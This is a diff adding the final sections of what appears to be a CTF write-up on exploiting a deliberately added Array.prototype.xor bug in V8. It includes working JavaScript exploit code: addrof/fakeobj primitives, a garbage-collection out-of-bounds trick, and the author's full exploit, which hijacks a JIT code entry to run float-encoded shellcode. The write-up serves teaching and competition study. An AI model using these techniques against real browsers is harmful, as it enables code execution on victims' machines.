@@ -1602,9 +1602,220 @@ gg.
 
 ## Part 6: What could've been
 
+Since this was my first time doing anything like this I made a few "mistakes" along the way. I think that's really the best way to learn, but I promised to show you a few different ways my exploit could've been significantly improved.
+
+The first thing is something I've already implemented in the final exploit code above - the `obj2ptr` function I nabbed from Popax21's exploit code. Originally, I used `%DebugPrint(arr)` to see the address of the `arr` array on every run to change the code accordingly, but there's a pretty easy way to not have to do that at all!
+
+```js
+// snippet from Popax21's exploit code
+function obj2ptr(obj) {
+    var arr = [13.37];
+
+    arr.xor({
+        valueOf: function() {
+            arr[0] = {}; //Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS
+            arr[0] = obj;
+            return 1; //Clear the lowest bit -> compressed SMI
+        } 
+    });
+    
+    return (arr[0] << 1) | 1;
+}
+
+function ptr2obj(ptr) {
+    var arr = [13.37];
+
+    arr.xor({
+        valueOf: function() {
+            arr[0] = {}; //Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS
+            arr[0] = (ptr >> 1);
+            return 1; //Set the lowest bit -> compressed pointer
+        } 
+    });
+    
+    return arr[0];
+}
+```
+
+Since the difference between a pointer and an SMI is just the last bit, we can put any object or pointer into an array, xor its last bit, and get out the pointer or object accordingly. While I only used those functions in my example exploit code to get the initial address of `arr`, they are pretty much equal to the full **addrof** and **fakeobj** primitives! Beautiful.
+
+Another approach to exploiting the xor I saw in a few solves was changing the length of the array to something small, then forcing a GC to defragment some other object into a region beyond past the array, and then changing the length back to a big amount to get an out-of-bounds read/write. This approach was probably quite brutal to work with, but earned rdjgr their first blood[^6].
+
+```js
+// snippet from rdjgr's exploit code
+function pwn() {
+    let num = {};
+    let size = 0x12;
+    let num_rets = 0x10;
+    let a = [];
+    for (let i = 0; i < size; i++) {
+        a.push(1.1);
+    }
+    var rets = [{a: 1.1}];
+    num.valueOf = function() {
+        console.log("valueof called");
+        a.length = 1;
+        gc();
+        rets.push({b: 1.1});
+
+        return 0x40;
+    };
+
+    a.xor(num);
+    rets.length = 900
+    return rets
+}
+```
+
+As for the code execution part, pretty much everyone went for a wasm rwx route instead of going through all the trouble I did to optimize a function into Maglev/Turbocode. [There](https://www.willsroot.io/2021/01/rope2-hackthebox-writeup-chromium-v8.html) [are](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/) [a](https://medium.com/@numencyberlabs/use-wasm-to-bypass-latest-chrome-v8sbx-again-639c4c05b157) [lot](https://jackfromeast.site/2024-01/v8-exploit-revist-oob-v8-starCTF-2019.html) [of](https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/Google2022/exp.js) [write-ups](https://tiszka.com/blog/CVE_2021_21225_exploit.html) for the wasm route, so I felt it'd be more fun to blog about a different approach, and it was the approach I took at the original CTF either way.
+
+In case you're wondering what my original code at the CTF looked like, it was this:
+
+```js
+// lyra
+var bs = new ArrayBuffer(8);
+var fs = new Float64Array(bs);
+var is = new BigUint64Array(bs);
+
+function ftoi(x) {
+  fs[0] = x;
+  return is[0];
+}
+
+function itof(x) {
+  is[0] = x;
+  return fs[0];
+}
 
 
-## Part 7: The end
+
+const foo = (() => {
+const f = () => {
+  return [
+1.9711828979523134e-246,
+1.9562205631094693e-246,
+1.9557819155246427e-246,
+1.9711824228871598e-246,
+1.971182639857203e-246,
+1.9711829003383248e-246,
+1.9895153920223886e-246,
+1.971182898881177e-246,
+  ];
+}
+//%PrepareFunctionForOptimization(f);
+f();
+//%OptimizeFunctionOnNextCall(f);
+for (var i = 0; i < 100000; i++) { f() }
+f()
+return f;
+})();
+
+var a = [];
+for (var i = 0; i < 100000; i++) { a[i] = new String("");foo(); }
+new ArrayBuffer(0x80000000);
+
+var arr1 = [5.432309235825e-312, 1337.888, 3.881131231533e-311, 5.432329947926e-312];
+var flt = [1.1];
+var tmp = {a: 1};
+var obj = [tmp];
+var array = [-0];
+var hasRun = false;
+
+//%DebugPrint(arr1);
+//%DebugPrint(flt);
+//%DebugPrint(obj);
+
+function getHandler() {
+  if (hasRun) return;
+  hasRun = true;
+  array[0] = arr1;
+  return 80;
+}
+
+x = []
+x.__defineGetter__("0", getHandler);
+
+array.xor(x);
+
+//%DebugPrint(arr1);
+
+//%SystemBreak();
+
+console.log("s1");
+
+const oob = array[0];
+
+console.log("s2");
+
+
+
+console.log("s3");
+
+function addrof(o) {
+  console.log("oob = oob");
+  oob[6] = oob[18]; 
+  console.log("obj[0] = o");
+  obj[0] = o;
+  console.log("ret");
+  return (ftoi(flt[0]) & 0xffffffffn) - 1n;
+}
+
+function read(p) {
+  let a = ftoi(oob[6]) >> 32n;
+  oob[6] = itof((a << 32n) + p - 8n + 1n);
+  return ftoi(flt[0]);
+}
+
+function write(p, x) {
+  let a = ftoi(oob[6]) >> 32n;
+  oob[6] = itof((a << 32n) + p - 8n + 1n);
+  flt[0] = itof(x);
+}
+
+console.log("s3.5");
+
+let foo_addr = addrof(foo);
+console.log(foo_addr);
+console.log(oob[0]);
+
+
+
+foo_addr = addrof(foo);
+console.log("foo_addr:", foo_addr);
+
+let code = (read(foo_addr + 0x08n) - 1n) >> 32n;
+console.log("code:", code);
+
+console.log("0x00:", read(foo_addr + 0x00n));
+console.log("0x10:", read(foo_addr + 0x10n));
+
+let entry = read(code - 0x100n + 0x113n);
+console.log("entry:", entry);
+
+write(code - 0x100n + 0x113n, entry + 0x53n);
+entry = read(code - 0x100n + 0x113n);
+
+console.log("entry:", entry);
+
+console.log("launching");
+console.log(tmp);
+
+foo();
+```
+
+Not as pretty as the one I made for the blog, but hey, I got the flag, and secured a place in the top 10 of the overall competition!
+
+## Part 7: Afterword
+
+thank you so much for checking out my writeup!!
+
+quite the blogpost, isn't it! i've never actually done this kind of pwn before, and i think i learned a lot, so i wanted to pass it forward and share it with you all!
+
+i worked really hard on making all of the html/css on this page be as helpful, interactive, and pretty as possible. as with my last post, everything here is html/css handcrafted with love - no images or javascript were used and it's all just 30kB<!-- todo change this number --> gzipped. oh and everything's responsive too so it should look great no matter if you're on a small phone or a big hidpi screen! try resizing your window and see how different parts of the post react to it.
+
+this post should work cross-browser, but the v8/gdb hover highlight things and the little endian widget don't work in the current version of ladybird because it doesn't support the `:has()` selector and resizable handles, hopefully it'll get those too at some point!
+
+**Discuss this post on:** twitter, mastodon, hackernews, cohost
 
 <style>
 .jsMem {
@@ -1817,6 +2028,8 @@ note: the v8/gdb highlighting thing doesn't work in the current version of ladyb
 [^4]: In memory, the length of the array appears as twice what it really is (eg 6 instead of 3) because SMIs need to end with a 0 bit or they'll become a tagged pointer. If the length of an array was over 2<sup>31</sup>-1 we'd see a pointer to a double instead.
 
 [^5]: JavaScript floating-point numbers can only accurately represent integers up to 2<sup>53</sup>–1. You *can* have larger numbers, but they won't be accurate. [BigInts](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt) are a separate data type that doesn't have this issue - they can be infinitely big while still being accurate! Well, perhaps not infinitely big, but [in V8](https://v8.dev/features/bigint) their size can be [over a billion bits](https://stackoverflow.com/a/70537884/2251833), which would be about 128MiB of just a single number.
+
+[^6]: In CTF competitions, a "first blood" is the first (and often fastest) solve of a challenge.
 
 <style>
 	.challDetails {
